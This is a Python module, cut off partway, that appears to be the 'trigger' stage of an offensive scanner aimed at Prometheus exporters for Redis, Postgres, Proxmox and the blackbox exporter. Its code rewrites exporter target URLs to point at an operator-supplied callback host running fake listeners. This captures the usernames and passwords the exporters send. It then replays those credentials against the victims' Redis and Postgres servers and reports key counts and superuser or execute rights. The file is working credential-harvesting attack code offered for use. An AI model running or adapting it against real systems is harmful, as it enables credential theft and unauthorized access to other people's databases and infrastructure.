"""Trigger stage."""

from __future__ import annotations

import argparse
import ipaddress
import json
import re
import socket
import ssl
import sys
import threading
import time
from collections.abc import Callable
from contextlib import nullcontext
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse

from .console import Console
from .exporters.http_client import build_exporter_tls_context
from .exporters.trigger import scan_exporters_and_trigger
from .listener_runtime import parse_services, start_listeners_for_trigger, stop_started_listeners
from .logger import AttemptLogger
from .profiles import load_profiles
from .rendering import colorize_spans, format_count_value
from .servers import RunningServer
from .stage_runtime import LineOutputSink, start_command_progress
from .utils import collect_scan_ports, collect_scan_target_specs, normalize_ip_literal, normalize_scan_host, utc_now_iso

_TRIGGER_EXPORTER_DISPLAY_NAMES = {
    "blackbox_exporter": "Blackbox Exporter",
    "postgres_exporter": "Postgres Exporter",
    "redis_exporter": "Redis Exporter",
    "proxmox_exporter": "Proxmox Exporter",
}

_EXPORTER_TO_LISTENER_SERVICE = {
    "blackbox_exporter": "blackbox",
    "postgres_exporter": "postgres",
    "redis_exporter": "redis",
    "proxmox_exporter": "proxmox",
}

_TRIGGER_EXPORTER_ALIASES = {
    "blackbox": "blackbox_exporter",
    "blackbox_exporter": "blackbox_exporter",
    "postgres": "postgres_exporter",
    "postgres_exporter": "postgres_exporter",
    "redis": "redis_exporter",
    "redis_exporter": "redis_exporter",
    "proxmox": "proxmox_exporter",
    "proxmox_exporter": "proxmox_exporter",
}

_DEFAULT_LISTENER_SERVICES_RAW = "postgres,redis,proxmox,blackbox"


def _clip_text(value: str, width: int) -> str:
    if len(value) <= width:
        return value
    if width <= 3:
        return value[:width]
    return value[: width - 3] + "..."


def _safe_int(value: Any) -> int | None:
    try:
        return int(value) if value is not None else None
    except (TypeError, ValueError):
        return None


def _as_text(value: object) -> str | None:
    text = str(value or "").strip()
    return text or None


def _json_record_from_trigger_event(event: dict[str, Any]) -> dict[str, Any] | None:
    if str(event.get("phase") or "").strip().lower() != "callback_result":
        return None
    confirmed = bool(event.get("confirmed", event.get("success")))
    http_status = _safe_int(event.get("status"))
    accepted = bool(event.get("accepted", http_status is not None and 200 <= http_status < 300))
    rejected = event.get("probe_success") is False or bool(event.get("error"))
    if confirmed:
        result_status = "trigger_success"
    elif accepted and not rejected:
        result_status = "trigger_accepted_unconfirmed"
    else:
        result_status = "trigger_error"
    record: dict[str, Any] = {
        "timestamp": utc_now_iso(),
        "source_type": "trigger",
        "host": _as_text(event.get("host")),
        "exporter": _as_text(event.get("exporter")) or "exporter",
        "port": _safe_int(event.get("exporter_port")),
        "listen_port": _safe_int(event.get("callback_port")),
        "callback_target": _as_text(event.get("callback_target")),
        "trigger_url": _as_text(event.get("trigger_url")),
        "target": _as_text(event.get("target")),
        "success": confirmed,
        "accepted": accepted,
        "confirmed": confirmed,
        "probe_success": event.get("probe_success"),
        "status": result_status,
        "http_status": http_status,
        "error": _as_text(event.get("error")),
    }
    return {key: value for key, value in record.items() if value is not None}


class _TriggerOutputError(RuntimeError):
    """A JSONL sink failure that must not be handled as a transport error."""


def _trigger_plain_row(stage_tag: str, target: str, port: str, marker: str, body: str) -> str:
    clipped_target = _clip_text(target, 64)
    clipped_port = _clip_text(port, 16)
    return f"{stage_tag:<8}\t{clipped_target}\t{clipped_port}\t {marker} {body}"


def _render_trigger_row(
    console: Console,
    target: str,
    marker: str,
    body: str,
    logger: AttemptLogger | None = None,
) -> None:
    stream = console._diagnostic_stream()
    marker_color = {"[*]": "cyan", "[+]": "green", "[-]": "red", "[!]": "red"}.get(marker, "white")
    clipped_target = _clip_text(target, 64)
    target_segment = "\t" + clipped_target + "\t-\t"
    line = (
        f"{console._paint('TRIGGER ', 'blue', stream)}"
        f"{console._paint(target_segment, 'white', stream)}"
        f" {console._paint(marker, marker_color, stream)} "
        f"{console._paint(body, 'white', stream)}"
    )
    console.plain(line, stream=stream)
    if logger is not None:
        logger.write_text_line(_trigger_plain_row("TRIGGER", target, "-", marker, body))


def _render_trigger_callback_row(
    console: Console,
    callback_target: str,
    callback_port: str,
    marker: str,
    exporter_name: str,
    stage_tag: str = "TRIGGER",
    logger: AttemptLogger | None = None,
) -> None:
    stream = console._diagnostic_stream()
    marker_color = {"[*]": "cyan", "[+]": "green", "[-]": "red", "[!]": "red"}.get(marker, "white")
    clipped_target = _clip_text(callback_target, 64)
    clipped_port = _clip_text(callback_port, 16)
    target_segment = "\t" + clipped_target + "\t" + clipped_port + "\t"
    line = (
        f"{console._paint(f'{stage_tag:<8}', 'blue', stream)}"
        f"{console._paint(target_segment, 'white', stream)}"
        f" {console._paint(marker, marker_color, stream)} "
        f"{console._paint(exporter_name, 'white', stream)}"
    )
    console.plain(line, stream=stream)
    if logger is not None:
        logger.write_text_line(_trigger_plain_row(stage_tag, callback_target, callback_port, marker, exporter_name))


def _render_trigger_check_row(
    console: Console,
    target: str,
    port: str,
    marker: str,
    body: str,
    logger: AttemptLogger | None = None,
) -> None:
    stream = console._diagnostic_stream()
    marker_color = {"[*]": "cyan", "[+]": "green", "[-]": "red", "[!]": "red"}.get(marker, "white")
    clipped_target = _clip_text(target, 64)
    clipped_port = _clip_text(port, 16)
    target_segment = "\t" + clipped_target + "\t" + clipped_port + "\t"
    stage_segment = f"{'CHECK':<8}"
    spans: list[tuple[int, int, str]] = []
    for fragment, color in (
        ("(auth required:True)", "bright_green"),
        ("(auth required:False)", "red"),
        ("(auth required:unknown)", "yellow"),
        ("(superuser:True)", "red"),
        ("(execute:True)", "red"),
        ("(read:True)", "red"),
    ):
        idx = body.find(fragment)
        if idx >= 0:
            spans.append((idx, idx + len(fragment), color))

    table_match = re.search(r"\(tables:(\d+)\)", body)
    if table_match and int(table_match.group(1)) > 0:
        spans.append((table_match.start(), table_match.end(), "orange"))

    key_match = re.search(r"\(keys:(\d+)(?: [^)]*)?\)", body)
    if key_match and key_match.group(1).isdigit() and int(key_match.group(1)) > 0:
        spans.append((key_match.start(), key_match.end(), "red"))

    body_colored = colorize_spans(console, body, spans)

    line = (
        f"{console._paint(stage_segment, 'blue', stream)}"
        f"{console._paint(target_segment, 'white', stream)}"
        f" {console._paint(marker, marker_color, stream)} "
        f"{body_colored}"
    )
    console.plain(line, stream=stream)
    if logger is not None:
        logger.write_text_line(_trigger_plain_row("CHECK", target, port, marker, body))


def _exporter_display_name(raw_name: str) -> str:
    key = (raw_name or "").strip().lower()
    return _TRIGGER_EXPORTER_DISPLAY_NAMES.get(key, raw_name)


def _with_listen_target_fmt(exporter: dict[str, Any], args: argparse.Namespace) -> str | None:
    name = str(exporter.get("name") or "")
    trigger_path = str(exporter.get("trigger_path") or "").strip()
    exporter_name = name.strip().lower()
    redis_port = int(getattr(args, "redis_port", 16379))
    postgres_port = int(getattr(args, "postgres_port", 15432))
    blackbox_port = int(getattr(args, "blackbox_port", 19115))
    proxmox_port = int(getattr(args, "proxmox_port", 18006))
    proxmox_tls = bool(getattr(args, "proxmox_tls", False))
    if exporter_name == "redis_exporter":
        raw_target_fmt = str(exporter.get("target_fmt") or "").strip()
        if not raw_target_fmt:
            return f"{{our_host}}:{redis_port}"
        if "://" not in raw_target_fmt and all(ch not in raw_target_fmt for ch in ("@", "/", "?")):
            return f"{{our_host}}:{redis_port}"
        parsed = urlparse(
            raw_target_fmt if "://" in raw_target_fmt else f"redis://{raw_target_fmt}",
            scheme="redis",
        )
        scheme = parsed.scheme or "redis"
        netloc = parsed.netloc or ""
        auth_part = ""
        if "@" in netloc:
            auth_part = netloc.rsplit("@", 1)[0]
        new_netloc = f"{auth_part + '@' if auth_part else ''}{{our_host}}:{redis_port}"
        return parsed._replace(scheme=scheme, netloc=new_netloc, fragment="").geturl()
    if exporter_name == "postgres_exporter":
        raw_target_fmt = str(exporter.get("target_fmt") or "").strip()
        parsed = urlparse(
            raw_target_fmt if "://" in raw_target_fmt else f"postgresql://{raw_target_fmt}",
            scheme="postgresql",
        )
        scheme = parsed.scheme or "postgresql"
        netloc = parsed.netloc or ""
        auth_part = ""
        if "@" in netloc:
            auth_part = netloc.rsplit("@", 1)[0]
        new_netloc = f"{auth_part + '@' if auth_part else ''}{{our_host}}:{postgres_port}"
        path = parsed.path or "/postgres"
        query = parsed.query or "sslmode=disable"
        return parsed._replace(scheme=scheme, netloc=new_netloc, path=path, query=query, fragment="").geturl()
    if exporter_name == "blackbox_exporter":
        raw_target_fmt = str(exporter.get("target_fmt") or "").strip()
        parsed = urlparse(raw_target_fmt if "://" in raw_target_fmt else f"http://{raw_target_fmt}", scheme="http")
        scheme = parsed.scheme.lower() if parsed.scheme else "http"

        auth_prefix = ""
        if parsed.username is not None:
            auth_prefix = parsed.username
            if parsed.password is not None:
                auth_prefix += f":{parsed.password}"
            auth_prefix += "@"

        path = parsed.path or ""
        query = f"?{parsed.query}" if parsed.query else ""
        return f"{scheme}://{auth_prefix}{{our_host}}:{blackbox_port}{path}{query}"
    if exporter_name == "proxmox_exporter":
        if trigger_path == "/pve":
            return f"{{our_host}}:{proxmox_port}"
        scheme = "https" if proxmox_tls else "http"
        return f"{scheme}://{{our_host}}:{proxmox_port}/api2/json/access/ticket"
    return None


def _patch_trigger_exporters_for_with_listen(
    trigger_exporters: list[dict[str, Any]],
    args: argparse.Namespace,
) -> list[dict[str, Any]]:
    patched: list[dict[str, Any]] = []
    for exporter in trigger_exporters:
        item = dict(exporter)
        override_target_fmt = _with_listen_target_fmt(item, args)
        if override_target_fmt:
            item["target_fmt"] = override_target_fmt
        patched.append(item)
    return patched


def _parse_trigger_exporter_filter(raw: str | None) -> set[str]:
    if raw is None:
        return set()
    selected: set[str] = set()
    unknown: set[str] = set()
    for part in str(raw).split(","):
        token = part.strip().lower()
        if not token:
            continue
        mapped = _TRIGGER_EXPORTER_ALIASES.get(token)
        if mapped is None:
            unknown.add(token)
            continue
        selected.add(mapped)
    if unknown:
        raise ValueError(
            "unsupported trigger exporters: "
            + ", ".join(sorted(unknown))
            + " (supported: blackbox,postgres,proxmox,redis)"
        )
    return selected


def _parse_postgres_auth_modules(raw_values: list[str] | None) -> list[str]:
    if not raw_values:
        return []
    result: list[str] = []
    seen: set[str] = set()
    for raw in raw_values:
        for part in str(raw).split(","):
            token = part.strip()
            if not token:
                continue
            if token in seen:
                continue
            seen.add(token)
            result.append(token)
    return result


def _merge_trigger_query_auth_module(raw_query: str | None, auth_module: str) -> str:
    pairs = [
        (k, v) for k, v in parse_qsl(str(raw_query or "").lstrip("?"), keep_blank_values=True) if k != "auth_module"
    ]
    pairs.append(("auth_module", auth_module))
    return urlencode(pairs, doseq=True)


def _expand_trigger_exporters_postgres_auth_modules(
    trigger_exporters: list[dict[str, Any]],
    auth_modules: list[str],
) -> list[dict[str, Any]]:
    if not auth_modules:
        return list(trigger_exporters)
    expanded: list[dict[str, Any]] = []
    for exporter in trigger_exporters:
        name = str(exporter.get("name") or "").strip().lower()
        if name != "postgres_exporter":
            expanded.append(dict(exporter))
            continue
        for auth_module in auth_modules:
            item = dict(exporter)
            item["trigger_query"] = _merge_trigger_query_auth_module(item.get("trigger_query"), auth_module)
            expanded.append(item)
    return expanded


def _filter_trigger_exporters(
    trigger_exporters: list[dict[str, Any]],
    selected_exporter_names: set[str],
) -> list[dict[str, Any]]:
    if not selected_exporter_names:
        return list(trigger_exporters)
    filtered = [
        item for item in trigger_exporters if str(item.get("name") or "").strip().lower() in selected_exporter_names
    ]
    return filtered


def _override_trigger_exporter_ports(
    trigger_exporters: list[dict[str, Any]],
    custom_ports: list[int],
) -> list[dict[str, Any]]:
    if not custom_ports:
        return list(trigger_exporters)
    ports = [int(port) for port in dict.fromkeys(custom_ports)]
    overridden: list[dict[str, Any]] = []
    for exporter in trigger_exporters:
        for port in ports:
            item = dict(exporter)
            item["port"] = int(port)
            overridden.append(item)
    return overridden


def _auto_adjust_listener_services_for_trigger_exporters(
    args: argparse.Namespace,
    selected_exporter_names: set[str],
    console: Console,
) -> None:
    if not getattr(args, "with_listen", False) or not selected_exporter_names:
        return

    required_services = {
        service
        for exporter_name in selected_exporter_names
        for service in [_EXPORTER_TO_LISTENER_SERVICE.get(exporter_name)]
        if service is not None
    }
    if not required_services:
        return

    try:
        current_services = parse_services(str(getattr(args, "services", _DEFAULT_LISTENER_SERVICES_RAW)))
    except ValueError:
        return

    if str(getattr(args, "services", "")) == _DEFAULT_LISTENER_SERVICES_RAW:
        adjusted_services = required_services
    else:
        adjusted_services = current_services | required_services

    args.services = ",".join(sorted(adjusted_services))
    console.debug(f"auto listener services for trigger exporters: {args.services}")


def _callback_event_has_complete_creds(event: dict[str, Any]) -> bool:
    return event.get("username") not in (None, "") and event.get("password") not in (None, "")


def _callback_event_remote_host(event: dict[str, Any]) -> str:
    remote = str(event.get("remote_addr") or "-")
    host = remote.rsplit(":", 1)[0] if ":" in remote else remote
    return host[1:-1] if host.startswith("[") and host.endswith("]") else host


def _normalized_correlation_host(value: object) -> str:
    host = str(value or "").strip().strip("[]").rstrip(".").lower()
    try:
        return ipaddress.ip_address(host).compressed
    except ValueError:
        return host


def _target_host_aliases(host: object) -> set[str]:
    normalized = _normalized_correlation_host(host)
    aliases = {normalized} if normalized else set()
    try:
        for result in socket.getaddrinfo(normalized, None, type=socket.SOCK_STREAM):
            aliases.add(_normalized_correlation_host(result[4][0]))
    except (OSError, UnicodeError):
        pass
    return aliases


def _correlated_callback_stats(
    trigger_summaries: list[dict[str, Any]],
    callback_events: list[dict[str, Any]],
) -> dict[str, Any]:
    """Count callbacks only from hosts that had a matching exporter attempt."""

    allowed_hosts_by_service: dict[str, set[str]] = {}
    attempts_by_service: dict[str, int] = {}
    unscoped_attempts = 0
    unscoped_allowed_hosts: set[str] = set()
    for summary in trigger_summaries:
        exporter_hosts = summary.get("attempts_by_exporter_host")
        if isinstance(exporter_hosts, dict) and exporter_hosts:
            for exporter_name, host_attempts in exporter_hosts.items():
                service = _EXPORTER_TO_LISTENER_SERVICE.get(str(exporter_name))
                if service is None or not isinstance(host_attempts, dict):
                    continue
                for host, count_raw in host_attempts.items():
                    count = int(count_raw or 0)
                    if count <= 0:
                        continue
                    attempts_by_service[service] = attempts_by_service.get(service, 0) + count
                    allowed_hosts_by_service.setdefault(service, set()).update(_target_host_aliases(host))
            continue

        # Compatibility with older/custom trigger implementations that do not
        # expose the exporter-to-host relation: restrict callbacks to scanned
        # hosts while retaining per-exporter attempt limits.
        all_host_aliases: set[str] = set()
        by_host = summary.get("by_host")
        if isinstance(by_host, dict):
            for host, stats in by_host.items():
                if isinstance(stats, dict) and int(stats.get("attempted", 0)) > 0:
                    all_host_aliases.update(_target_host_aliases(host))
        by_exporter = summary.get("by_exporter")
        if isinstance(by_exporter, dict) and by_exporter:
            for exporter_name, stats in by_exporter.items():
                service = _EXPORTER_TO_LISTENER_SERVICE.get(str(exporter_name))
                if service is None or not isinstance(stats, dict):
                    continue
                count = int(stats.get("attempted", 0))
                if count <= 0:
                    continue
                attempts_by_service[service] = attempts_by_service.get(service, 0) + count
                allowed_hosts_by_service.setdefault(service, set()).update(all_host_aliases)
        else:
            unscoped_attempts += int(summary.get("attempted", 0))
            unscoped_allowed_hosts.update(all_host_aliases)

    callbacks_by_service: dict[str, int] = {}
    seen_connections: set[tuple[str, str, str]] = set()
    for event in callback_events:
        service = str(event.get("service") or "").strip().lower()
        if service not in attempts_by_service and unscoped_attempts <= 0:
            continue
        remote_host = _normalized_correlation_host(_callback_event_remote_host(event))
        allowed_hosts = allowed_hosts_by_service.get(service, set())
        if service not in attempts_by_service:
            allowed_hosts = unscoped_allowed_hosts
        if remote_host not in allowed_hosts:
            continue
        signature = (
            service,
            str(event.get("remote_addr") or "-"),
            str(event.get("listen_port") or "-"),
        )
        if signature in seen_connections:
            continue
        seen_connections.add(signature)
        callbacks_by_service[service] = callbacks_by_service.get(service, 0) + 1

    limited_by_service = {
        service: min(count, callbacks_by_service.get(service, 0)) for service, count in attempts_by_service.items()
    }
    scoped_total = sum(limited_by_service.values())
    unscoped_total = min(
        unscoped_attempts,
        sum(count for service, count in callbacks_by_service.items() if service not in attempts_by_service),
    )
    return {"total": scoped_total + unscoped_total, "by_service": limited_by_service}


def _run_trigger_credential_checks(args: argparse.Namespace, logger: AttemptLogger, console: Console) -> None:
    from .stage_postgres import _audit_postgres_host
    from .stage_postgres import _caps_suffix as _postgres_caps_suffix
    from .stage_redis import _audit_redis_host

    show_debug_details = bool(getattr(args, "debug", False))

    raw_events = logger.get_trigger_callback_events()
    check_events: list[dict[str, Any]] = []
    for event in raw_events:
        service = str(event.get("service") or "").strip().lower()
        if service not in {"redis", "postgres"}:
            continue
        if not _callback_event_has_complete_creds(event):
            continue
        check_events.append(event)

    if not check_events:
        console.info("trigger credential checks: no Redis/Postgres credentials captured")
        return

    console.info(f"trigger credential checks: {len(check_events)} captured credential event(s)")

    for event in sorted(
        check_events,
        key=lambda item: (
            str(item.get("service") or ""),
            _callback_event_remote_host(item),
            str(item.get("listen_port") or ""),
        ),
    ):
        service = str(event.get("service") or "").strip().lower()
        host = _callback_event_remote_host(event)
        username = str(event.get("username") or "")
        password = str(event.get("password") or "")
        cred_display = f"{username}:{password}"

        if service == "redis":
            port = 6379
            _render_trigger_check_row(console, host, str(port), "[*]", "Redis credentials Check", logger=logger)
            record = _audit_redis_host(
                host=host,
                port=port,
                timeout=args.timeout,
                retries=args.retries,
                username=username or None,
                password=password,
                defcreds=False,
                show_keys=False,
                dump_keys=False,
                query_key=None,
            )
            status = str(record.get("status") or "fail")
            err = str(record.get("error") or "").strip()
            if status in {"valid_credentials", "open_no_auth", "weak_default_creds"}:
                key_count = record.get("key_count")
                keys_part = f" (keys:{format_count_value(key_count)})"
                if status == "valid_credentials":
                    body = f"{cred_display}{keys_part}"
                elif status == "weak_default_creds":
                    body = f"redis:redis{keys_part}"
                else:
                    body = f"anonymous access{keys_part}"
                _render_trigger_check_row(console, host, str(port), "[+]", body, logger=logger)
            elif status == "auth_required":
                body = f"{cred_display} auth failed"
                if err and show_debug_details:
                    body += f" err={_clip_text(err, 80)}"
                _render_trigger_check_row(console, host, str(port), "[-]", body, logger=logger)
            else:
                body = "Redis connection failed"
                if err:
                    body += f" err={_clip_text(err, 80)}"
                _render_trigger_check_row(console, host, str(port), "[!]", body, logger=logger)
            continue

        port = 5432
        _render_trigger_check_row(
            console, host, str(port), "[*]", f"Postgres credentials {cred_display}", logger=logger
        )
        record = _audit_postgres_host(
            host=host,
            port=port,
            timeout=args.timeout,
            retries=args.retries,
            username=username or None,
            password=password,
            defcreds=False,
            database="postgres",
            show_databases=False,
            show_tables=False,
            show_columns=False,
            table_targets=[],
            table_columns=[],
            dump_table_rows=False,
            execute_command=None,
            sql_command=None,
        )
        status = str(record.get("status") or "fail")
        err = str(record.get("error") or "").strip()
        if status in {"valid_credentials", "open_no_auth", "weak_default_creds"}:
            if status == "valid_credentials":
                body = f"{cred_display} {_postgres_caps_suffix(record)}"
            elif status == "weak_default_creds":
                body = f"postgres:postgres {_postgres_caps_suffix(record)}"
            else:
                body = f"anonymous access {_postgres_caps_suffix(record)}"
            _render_trigger_check_row(console, host, str(port), "[+]", body, logger=logger)
        elif status == "auth_required":
            body = f"Postgres credentials invalid ({cred_display})"
            if err and show_debug_details:
                body += f" err={_clip_text(err, 80)}"
            _render_trigger_check_row(console, host, str(port), "[-]", body, logger=logger)
        else:
            body = "Postgres connection failed"
            if err:
                body += f" err={_clip_text(err, 80)}"
            _render_trigger_check_row(console, host, str(port), "[!]", body, logger=logger)


def _run_trigger_requests(
    args: argparse.Namespace,
    logger: AttemptLogger,
    console: Console,
    hosts: list[str],
    callback_targets: list[str],
    trigger_exporters: list[dict[str, Any]],
    show_trigger_info: bool,
    log_trigger_attempts: bool,
    record_sink: LineOutputSink | None = None,
    progress_advance: Callable[[int], None] | None = None,
    progress_add_total: Callable[[int], None] | None = None,
    scheme: str = "http",
    tls_context: ssl.SSLContext | None = None,
) -> dict[str, Any]:
    callbacks = ",".join(callback_targets)
    if show_trigger_info:
        console.info(
            f"trigger started: hosts={len(hosts)} callbacks={callbacks} "
            f"timeout={args.timeout}s workers={args.workers} retries={args.retries}"
        )
    callback_emit_lock = threading.Lock()
    emitted_scan_rows: set[tuple[str, str, str]] = set()
    record_sink_failed = False

    def _emit_trigger_event(event: dict[str, Any]) -> None:
        nonlocal record_sink_failed
        if record_sink is not None:
            json_record = _json_record_from_trigger_event(event)
            if json_record is not None:
                with callback_emit_lock:
                    if record_sink_failed:
                        return
                    try:
                        record_sink.emit_many([json.dumps(json_record, ensure_ascii=False)])
                    except (OSError, TypeError, ValueError) as exc:
                        record_sink_failed = True
                        raise _TriggerOutputError(str(exc)) from exc
        phase = str(event.get("phase") or "")
        if phase == "detect_hit":
            scan_target = str(event.get("host") or "-")
            scan_port = str(event.get("exporter_port") or "-")
        elif phase == "callback_attempt":
            # Backward compatibility fallback for older scanner emitters.
            scan_target = str(event.get("host") or event.get("callback_target") or "-")
            scan_port = str(event.get("exporter_port") or event.get("callback_port") or "-")
        else:
            return
        exporter_name = _exporter_display_name(str(event.get("exporter") or "-"))
        row_key = (scan_target, scan_port, exporter_name)
        with callback_emit_lock:
            if row_key in emitted_scan_rows:
                return
            emitted_scan_rows.add(row_key)
            _render_trigger_callback_row(
                console,
                scan_target,
                scan_port,
                "[*]",
                exporter_name,
                stage_tag="SCAN",
                logger=logger,
            )

    def _emit_stage_event(event: dict[str, Any]) -> None:
        if not args.debug:
            return
        kind = str(event.get("kind") or "")
        if kind == "pass":
            pass_name = str(event.get("pass") or "")
            event_name = str(event.get("event") or "")
            total = int(event.get("total") or 0)
            if pass_name == "detect" and event_name == "start":
                console.debug(f"pass=1 detect start total={total}")
                return
            if pass_name == "detect" and event_name == "complete":
                detected_exporters = int(event.get("detected_exporters") or 0)
                deep_candidates = int(event.get("deep_candidates") or 0)
                console.debug(
                    f"pass=1 detect complete detected_exporters={detected_exporters} deep_candidates={deep_candidates}"
                )
                return
            if pass_name == "deep" and event_name == "start":
                console.debug(f"pass=2 deep start total={total}")
                return
            if pass_name == "deep" and event_name == "complete":
                processed = int(event.get("processed") or 0)
                console.debug(f"pass=2 deep complete processed={processed}")
                return
            return
        if kind == "gate":
            host = str(event.get("host") or "-")
            gate = str(event.get("gate") or "skip")
            reason = str(event.get("reason") or "-")
            console.debug(f"{host} stage2_gate={gate} reason={reason}")
            return
        if kind == "stage_trace":
            stage_name = str(event.get("stage_name") or "-")
            attempt = int(event.get("attempt") or 1)
            duration_ms = int(event.get("duration_ms") or 0)
            result = str(event.get("result") or "ok")
            error = str(event.get("error") or "-")
            console.debug(
                f"stage_trace stage_name={stage_name} attempt={attempt} duration_ms={duration_ms} "
                f"result={result} error={error}"
            )
            return
        if kind == "timing_summary":
            status = str(event.get("status") or "ok")
            attempts = str(event.get("attempts") or "1/1")
            detect_ms = int(event.get("detect_ms") or 0)
            data_ms = int(event.get("data_ms") or 0)
            total_ms = int(event.get("total_ms") or 0)
            console.debug(
                f"stage_timing_summary status={status} attempts={attempts} "
                f"detect_ms={detect_ms} data_ms={data_ms} total_ms={total_ms}"
            )

    trigger_logger = logger if log_trigger_attempts else None
    summary = scan_exporters_and_trigger(
        logger=trigger_logger,
        hosts=hosts,
        callback_targets=callback_targets,
        timeout=args.timeout,
        workers=args.workers,
        retries=args.retries,
        trigger_exporters=trigger_exporters,
        log_trigger_events_only=not args.debug,
        emit_trigger_event=_emit_trigger_event if (args.with_listen or record_sink is not None) else None,
        emit_stage_event=_emit_stage_event if args.debug else None,
        progress_advance=progress_advance,
        progress_add_total=progress_add_total,
        scheme=scheme,
        tls_context=tls_context,
    )
    attempted = int(summary.get("attempted", 0))
    accepted = int(summary.get("accepted", 0))
    display_success = int(summary.get("triggered", 0))
    display_fail = int(summary.get("failed", max(0, attempted - display_success)))
    display_unconfirmed = int(summary.get("unconfirmed", max(0, accepted - display_success)))

    if args.with_listen and show_trigger_info:
        callback_stats = logger.get_trigger_callback_stats()
        by_service = callback_stats.get("by_service", {})
        callback_based_success = 0
        by_exporter = summary.get("by_exporter")
        if isinstance(by_exporter, dict) and by_exporter:
            for exporter_name, exporter_stats in by_exporter.items():
                if not isinstance(exporter_stats, dict):
                    continue
                service_name = _EXPORTER_TO_LISTENER_SERVICE.get(str(exporter_name))
                if service_name is None:
                    continue
                exporter_attempted = int(exporter_stats.get("attempted", 0))
                callback_hits = int(by_service.get(service_name, 0))
                callback_based_success += min(exporter_attempted, callback_hits)
        else:
            callback_based_success = int(callback_stats.get("total", 0))

        display_success = min(attempted, callback_based_success)
        display_unconfirmed = max(0, attempted - display_success - display_fail)
        if args.debug:
            console.debug(
                "with-listen summary mode: "
                f"callback_success={display_success} callback_fail={display_fail} "
                f"trigger_success={summary.get('triggered', 0)} trigger_fail={summary.get('failed', 0)}"
            )

    if show_trigger_info:
        console.info(
            "trigger complete: "
            f"hosts={len(hosts)} detected={summary['detected_exporters']} "
            f"attempts={attempted} accepted={accepted} confirmed={display_success} "
            f"unconfirmed={display_unconfirmed} fail={display_fail}"
        )
        if args.debug:
            for host, stats in sorted(summary["by_host"].items()):
                marker = "[+]" if stats["success"] > 0 else ("[-]" if stats["detected"] > 0 else "[!]")
                _render_trigger_row(
                    console,
                    host,
                    marker,
                    (
                        f"detected={stats['detected']} attempts={stats['attempted']} "
                        f"accepted={stats.get('accepted', 0)} confirmed={stats['success']} "
                        f"unconfirmed={stats.get('unconfirmed', 0)} fail={stats['fail']}"
                    ),
                    logger=logger,
                )
            for target in callback_targets:
                stats = summary["by_callback"].get(target, {"attempted": 0, "success": 0, "fail": 0})
                callback_attempted = int(stats.get("attempted", 0))
                callback_success = int(stats.get("success", 0))
                callback_fail = int(stats.get("fail", 0))
                marker = "[+]" if callback_success > 0 else ("[-]" if callback_attempted > 0 else "[!]")
                _render_trigger_row(
                    console,
                    f"callback={target}",
                    marker,
                    f"attempts={callback_attempted} accepted={stats.get('accepted', 0)} "
                    f"confirmed={callback_success} unconfirmed={stats.get('unconfirmed', 0)} "
                    f"fail={callback_fail}",
                    logger=logger,
                )
    for host, stats in sorted(summary["by_host"].items()):
        console.debug(
            f"host={host} detected={stats['detected']} "
            f"attempts={stats['attempted']} success={stats['success']} fail={stats['fail']}"
        )
    if show_trigger_info:
        console.debug("debug mode enabled; detailed trigger events emitted in text logs")
    return summary


def run_trigger_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
    console = Console(debug=args.debug)
    listen_seconds = getattr(args, "listen_seconds", None)
    output_format = str(getattr(args, "output_format", "txt") or "txt").strip().lower()
    output_path = getattr(args, "output", None)
    stream_to_stdout = not bool(output_path)
    console.set_structured_output(output_format == "json")

    if args.timeout <= 0:
        console.error("--timeout must be > 0")
        return 2
    if args.retries < 0:
        console.error("--retries must be >= 0")
        return 2
    if listen_seconds is not None and listen_seconds <= 0:
        console.error("--listen-seconds must be > 0")
        return 2
    if getattr(args, "check_credentials", False) and not getattr(args, "with_listen", False):
        console.error("--check-credentials requires --with-listen")
        return 2
    if output_format == "json" and getattr(args, "with_listen", False) and stream_to_stdout:
        console.error("--format json with --with-listen requires --output")
        return 2

    try:
        custom_ports = collect_scan_ports(getattr(args, "ports", None))
    except ValueError as exc:
        console.error(f"failed to parse --ports: {exc}")
        return 2

    targets = getattr(args, "targets", None) or getattr(args, "hosts", None)
    hosts_file = getattr(args, "hosts_file", None)
    if hosts_file:
        targets = f"{targets},{hosts_file}" if targets else hosts_file

    try:
        target_specs = collect_scan_target_specs(targets, exclude_targets=getattr(args, "out_targets", None))
    except (OSError, ValueError) as exc:
        console.error(f"failed to parse targets: {exc}")
        return 2

    try:
        profiles = load_profiles(args.profiles_file)
    except (OSError, ValueError) as exc:
        console.error(f"failed to load profiles: {exc}")
        return 2

    try:
        selected_trigger_exporters = _parse_trigger_exporter_filter(getattr(args, "trigger_exporters_filter", None))
    except ValueError as exc:
        console.error(str(exc))
        return 2
    postgres_auth_modules = _parse_postgres_auth_modules(getattr(args, "postgres_auth_modules", None))

    if not target_specs:
        if targets and getattr(args, "out_targets", None):
            console.error("all targets were excluded by --out-target")
            return 2
        console.error("trigger requires -t/--targets")
        return 2
    try:
        tls_context = build_exporter_tls_context(
            insecure=bool(getattr(args, "insecure", False)),
            ca_file=getattr(args, "tls_ca", None),
            cert_file=getattr(args, "tls_cert", None),
            key_file=getattr(args, "tls_key", None),
        )
    except (OSError, ValueError, ssl.SSLError) as exc:
        console.error(f"invalid exporter TLS configuration: {exc}")
        return 2

    callback_targets: list[str] = []

    callback_ip = normalize_ip_literal(args.callback_ip or "")
    if args.callback_ip and not callback_ip:
        console.error("--callback-ip must be a valid IP address")
        return 2
    if callback_ip:
        callback_targets.append(callback_ip)

    callback_dns = normalize_scan_host(args.callback_dns or "")
    if args.callback_dns and not callback_dns:
        console.error("--callback-dns must be a valid DNS name or host")
        return 2
    if callback_dns and callback_dns not in callback_targets:
        callback_targets.append(callback_dns)

    if not callback_targets:
        console.error("trigger requires --callback-ip and/or --callback-dns")
        return 2

    if output_path:
        if output_format == "txt":
            try:
                logger.set_text_output(output_path)
            except OSError as exc:
                console.error(f"failed to open trigger output file: {exc}")
                return 2
        console.info(f"trigger output file: {output_path}")

    trigger_exporters = _filter_trigger_exporters(profiles["trigger_exporters"], selected_trigger_exporters)
    if selected_trigger_exporters and not trigger_exporters:
        console.error("no trigger exporters matched filter")
        return 2
    if postgres_auth_modules:
        if not any(str(item.get("name") or "").strip().lower() == "postgres_exporter" for item in trigger_exporters):
            console.error("--postgres-auth-module requires postgres_exporter to be enabled in trigger exporters")
            return 2
        trigger_exporters = _expand_trigger_exporters_postgres_auth_modules(trigger_exporters, postgres_auth_modules)
        console.debug("postgres auth_module probes=" + ",".join(postgres_auth_modules))
    if selected_trigger_exporters:
